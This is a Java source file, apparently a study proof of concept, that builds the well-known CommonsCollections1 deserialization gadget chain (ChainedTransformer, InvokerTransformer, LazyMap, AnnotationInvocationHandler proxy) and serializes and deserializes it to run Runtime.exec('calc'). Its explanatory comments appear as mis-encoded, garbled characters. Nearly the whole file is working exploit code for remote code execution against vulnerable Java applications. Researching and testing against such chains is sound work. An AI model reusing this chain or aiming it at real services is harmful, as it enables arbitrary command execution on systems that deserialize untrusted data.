package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1  {

    /**
     * 3.1-3.2.1 jdk�汾С��u71
     *
     * ->AnnotationInvocationHandler.readObject()
     *       ->mapProxy.entrySet().iterator()  //��̬������
     *           ->AnnotationInvocationHandler.invoke()
     *             ->LazyMap.get()
     *                 ->ChainedTransformer.transform()
     *                 ->ConstantTransformer.transform()
     *                     ->InvokerTransformer.transform()
     *                     ->��������
     *
     * Q��Ϊʲô������Ҫ���л�
     * A����Ϊ��Ҫ����readObject���������������Annotion��д�ĺ�������javaԭ��
     * Q��Ϊʲô��Ҫ����readObject����
     * A����Ϊ�ú����е�����get������������������ΪMap��memberValues���ԣ�����Entry����ִ��setVaule����
     * Q��Ϊʲôһ����Ҫ����get������
     * A����Ϊ��ҪlazyMap��get���������transform������
     * Q��Ϊʲôһ��Ҫ����transform������
     * A����Ϊtransform������ͨ�����䣬����ָ�����������Դ����ض��Ķ�����ִ��ϵͳ����
     *
     * @param args
     */
    public static void main(String[] args) {
        //Transformer����
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                //˼����Ϊʲô�ڶ��������е�������ֵ���е���һ��ֵ���ܼ򵥣���Ϊ�÷����Ķ������Ҫ�������������ͣ��������������Ǹ�ǰ��ķ���ָ������
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                //invoke�����ĵ�һ��������null����ʾ���þ�̬�������ڶ���������һ���յ�Object���飬��ʾ���õķ���û�в�����������õĽ���Ƿ���null����Ϊ����û��ָ��Ҫ���õ�
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformerʵ��
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        //LazyMapʵ��
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        try {
            //AnnotationInvocationHandlerע��Ķ�̬����
            //�����ȡAnnotationInvocationHandlerʵ��
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            //���ﴴ��handle��Ϊ����LazyMap������̬���������ΪAnnotation�Զ�ʵ����InvocationHandle�ӿڣ������������ֱ��ת��
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

            //��̬�����࣬����һ��D�������Ϊ�˴��� AnnotationInvocationHandler#invoke
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);

            //���л�
            //����ʹ��jdk281�ᱨ��org.apache.commons.collections.functors.InvokerTransformer�����л����л�������
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(handler1);
            oos.flush();
            oos.close();

            //���Է����л�
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
